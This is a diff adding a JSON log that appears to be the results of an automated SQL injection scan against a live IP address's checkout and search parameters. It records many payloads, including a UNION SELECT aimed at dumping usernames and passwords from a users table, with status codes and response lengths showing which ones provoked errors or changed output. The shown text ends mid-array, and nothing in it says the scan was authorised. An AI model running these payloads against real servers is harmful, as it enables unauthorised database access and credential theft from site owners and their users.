@@ -1,0 +1,1778 @@
+[
+  {
+    "url": "http://52.247.225.51/checkout?productId=5",
+    "param": "productId",
+    "payload": "' OR '1'='1",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 189
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=5",
+    "param": "productId",
+    "payload": "' UNION SELECT NULL--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 196
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=5",
+    "param": "productId",
+    "payload": "' UNION SELECT 1,2,3--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 197
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=5",
+    "param": "productId",
+    "payload": "1' AND SLEEP(4)--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 192
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=5",
+    "param": "productId",
+    "payload": "' OR 1=1--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 185
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=5",
+    "param": "productId",
+    "payload": "' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 246
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=9",
+    "param": "productId",
+    "payload": "' OR '1'='1",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 189
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=9",
+    "param": "productId",
+    "payload": "' UNION SELECT NULL--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 196
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=9",
+    "param": "productId",
+    "payload": "' UNION SELECT 1,2,3--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 197
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=9",
+    "param": "productId",
+    "payload": "1' AND SLEEP(4)--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 192
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=9",
+    "param": "productId",
+    "payload": "' OR 1=1--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 185
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=9",
+    "param": "productId",
+    "payload": "' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 246
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=4",
+    "param": "productId",
+    "payload": "' OR '1'='1",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 189
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=4",
+    "param": "productId",
+    "payload": "' UNION SELECT NULL--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 196
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=4",
+    "param": "productId",
+    "payload": "' UNION SELECT 1,2,3--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 197
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=4",
+    "param": "productId",
+    "payload": "1' AND SLEEP(4)--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 192
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=4",
+    "param": "productId",
+    "payload": "' OR 1=1--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 185
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=4",
+    "param": "productId",
+    "payload": "' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 246
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=3",
+    "param": "productId",
+    "payload": "' OR '1'='1",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 189
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=3",
+    "param": "productId",
+    "payload": "' UNION SELECT NULL--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 196
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=3",
+    "param": "productId",
+    "payload": "' UNION SELECT 1,2,3--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 197
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=3",
+    "param": "productId",
+    "payload": "1' AND SLEEP(4)--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 192
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=3",
+    "param": "productId",
+    "payload": "' OR 1=1--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 185
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=3",
+    "param": "productId",
+    "payload": "' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 246
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=8",
+    "param": "productId",
+    "payload": "' OR '1'='1",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 189
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=8",
+    "param": "productId",
+    "payload": "' UNION SELECT NULL--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 196
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=8",
+    "param": "productId",
+    "payload": "' UNION SELECT 1,2,3--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 197
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=8",
+    "param": "productId",
+    "payload": "1' AND SLEEP(4)--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 192
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=8",
+    "param": "productId",
+    "payload": "' OR 1=1--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 185
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=8",
+    "param": "productId",
+    "payload": "' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 246
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=2",
+    "param": "productId",
+    "payload": "' OR '1'='1",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 189
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=2",
+    "param": "productId",
+    "payload": "' UNION SELECT NULL--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 196
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=2",
+    "param": "productId",
+    "payload": "' UNION SELECT 1,2,3--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 197
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=2",
+    "param": "productId",
+    "payload": "1' AND SLEEP(4)--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 192
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=2",
+    "param": "productId",
+    "payload": "' OR 1=1--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 185
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=2",
+    "param": "productId",
+    "payload": "' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 246
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=6",
+    "param": "productId",
+    "payload": "' OR '1'='1",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 189
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=6",
+    "param": "productId",
+    "payload": "' UNION SELECT NULL--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 196
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=6",
+    "param": "productId",
+    "payload": "' UNION SELECT 1,2,3--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 197
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=6",
+    "param": "productId",
+    "payload": "1' AND SLEEP(4)--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 192
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=6",
+    "param": "productId",
+    "payload": "' OR 1=1--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 185
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=6",
+    "param": "productId",
+    "payload": "' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 246
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=1",
+    "param": "productId",
+    "payload": "' OR '1'='1",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 189
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=1",
+    "param": "productId",
+    "payload": "' UNION SELECT NULL--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 196
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=1",
+    "param": "productId",
+    "payload": "' UNION SELECT 1,2,3--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 197
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=1",
+    "param": "productId",
+    "payload": "1' AND SLEEP(4)--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 192
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=1",
+    "param": "productId",
+    "payload": "' OR 1=1--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 185
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=1",
+    "param": "productId",
+    "payload": "' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 246
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=7",
+    "param": "productId",
+    "payload": "' OR '1'='1",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 189
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=7",
+    "param": "productId",
+    "payload": "' UNION SELECT NULL--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 196
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=7",
+    "param": "productId",
+    "payload": "' UNION SELECT 1,2,3--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 197
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=7",
+    "param": "productId",
+    "payload": "1' AND SLEEP(4)--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 192
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=7",
+    "param": "productId",
+    "payload": "' OR 1=1--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 185
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=7",
+    "param": "productId",
+    "payload": "' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 246
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "q",
+    "payload": "' OR '1'='1",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24343
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "q",
+    "payload": "' UNION SELECT NULL--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 1168
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "q",
+    "payload": "' UNION SELECT 1,2,3--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 1171
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "q",
+    "payload": "1' AND SLEEP(4)--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 1156
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "q",
+    "payload": "' OR 1=1--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 1135
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "q",
+    "payload": "' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 1296
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "q",
+    "payload": "' OR '1'='1",
+    "type": "Boolean/Content",
+    "status_code": 200,
+    "response_length": 11266
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "q",
+    "payload": "' UNION SELECT NULL--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 1180
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "q",
+    "payload": "' UNION SELECT 1,2,3--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 1183
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "q",
+    "payload": "1' AND SLEEP(4)--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 1168
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "q",
+    "payload": "' OR 1=1--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 1147
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "q",
+    "payload": "' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 1304
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "q",
+    "payload": "' OR '1'='1",
+    "type": "Boolean/Content",
+    "status_code": 200,
+    "response_length": 11260
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "q",
+    "payload": "' UNION SELECT NULL--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 1171
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "q",
+    "payload": "' UNION SELECT 1,2,3--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 1174
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "q",
+    "payload": "1' AND SLEEP(4)--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 1159
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "q",
+    "payload": "' OR 1=1--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 1138
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "q",
+    "payload": "' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 1298
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "q",
+    "payload": "' OR '1'='1",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 1146
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "q",
+    "payload": "' UNION SELECT NULL--",
+    "type": "Boolean/Content",
+    "status_code": 200,
+    "response_length": 11280
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "q",
+    "payload": "' UNION SELECT 1,2,3--",
+    "type": "Boolean/Content",
+    "status_code": 200,
+    "response_length": 11282
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "q",
+    "payload": "1' AND SLEEP(4)--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 1176
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "q",
+    "payload": "' OR 1=1--",
+    "type": "Boolean/Content",
+    "status_code": 200,
+    "response_length": 11258
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "q",
+    "payload": "' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 1298
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "search",
+    "payload": "' OR '1'='1",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "search",
+    "payload": "' UNION SELECT NULL--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "search",
+    "payload": "' UNION SELECT 1,2,3--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "search",
+    "payload": "1' AND SLEEP(4)--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "search",
+    "payload": "' OR 1=1--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "search",
+    "payload": "' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "search",
+    "payload": "' OR '1'='1",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "search",
+    "payload": "' UNION SELECT NULL--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "search",
+    "payload": "' UNION SELECT 1,2,3--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "search",
+    "payload": "1' AND SLEEP(4)--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "search",
+    "payload": "' OR 1=1--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "search",
+    "payload": "' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "search",
+    "payload": "' OR '1'='1",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "search",
+    "payload": "' UNION SELECT NULL--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "search",
+    "payload": "' UNION SELECT 1,2,3--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "search",
+    "payload": "1' AND SLEEP(4)--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "search",
+    "payload": "' OR 1=1--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "search",
+    "payload": "' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "search",
+    "payload": "' OR '1'='1",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "search",
+    "payload": "' UNION SELECT NULL--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "search",
+    "payload": "' UNION SELECT 1,2,3--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "search",
+    "payload": "1' AND SLEEP(4)--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "search",
+    "payload": "' OR 1=1--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "search",
+    "payload": "' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "query",
+    "payload": "' OR '1'='1",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "query",
+    "payload": "' UNION SELECT NULL--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "query",
+    "payload": "' UNION SELECT 1,2,3--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "query",
+    "payload": "1' AND SLEEP(4)--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "query",
+    "payload": "' OR 1=1--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "query",
+    "payload": "' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "query",
+    "payload": "' OR '1'='1",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "query",
+    "payload": "' UNION SELECT NULL--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "query",
+    "payload": "' UNION SELECT 1,2,3--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "query",
+    "payload": "1' AND SLEEP(4)--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "query",
+    "payload": "' OR 1=1--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "query",
+    "payload": "' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "query",
+    "payload": "' OR '1'='1",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "query",
+    "payload": "' UNION SELECT NULL--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "query",
+    "payload": "' UNION SELECT 1,2,3--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "query",
+    "payload": "1' AND SLEEP(4)--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "query",
+    "payload": "' OR 1=1--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "query",
+    "payload": "' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "query",
+    "payload": "' OR '1'='1",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "query",
+    "payload": "' UNION SELECT NULL--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "query",
+    "payload": "' UNION SELECT 1,2,3--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "query",
+    "payload": "1' AND SLEEP(4)--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "query",
+    "payload": "' OR 1=1--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "query",
+    "payload": "' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "s",
+    "payload": "' OR '1'='1",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "s",
+    "payload": "' UNION SELECT NULL--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "s",
+    "payload": "' UNION SELECT 1,2,3--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "s",
+    "payload": "1' AND SLEEP(4)--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "s",
+    "payload": "' OR 1=1--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "s",
+    "payload": "' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "s",
+    "payload": "' OR '1'='1",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "s",
+    "payload": "' UNION SELECT NULL--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "s",
+    "payload": "' UNION SELECT 1,2,3--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "s",
+    "payload": "1' AND SLEEP(4)--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "s",
+    "payload": "' OR 1=1--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "s",
+    "payload": "' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "s",
+    "payload": "' OR '1'='1",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "s",
+    "payload": "' UNION SELECT NULL--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "s",
+    "payload": "' UNION SELECT 1,2,3--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "s",
+    "payload": "1' AND SLEEP(4)--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "s",
+    "payload": "' OR 1=1--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "s",
+    "payload": "' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "s",
+    "payload": "' OR '1'='1",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "s",
+    "payload": "' UNION SELECT NULL--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "s",
+    "payload": "' UNION SELECT 1,2,3--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "s",
+    "payload": "1' AND SLEEP(4)--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "s",
+    "payload": "' OR 1=1--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "s",
+    "payload": "' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "keyword",
+    "payload": "' OR '1'='1",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "keyword",
+    "payload": "' UNION SELECT NULL--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "keyword",
+    "payload": "' UNION SELECT 1,2,3--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "keyword",
+    "payload": "1' AND SLEEP(4)--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "keyword",
+    "payload": "' OR 1=1--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "keyword",
+    "payload": "' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "keyword",
+    "payload": "' OR '1'='1",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
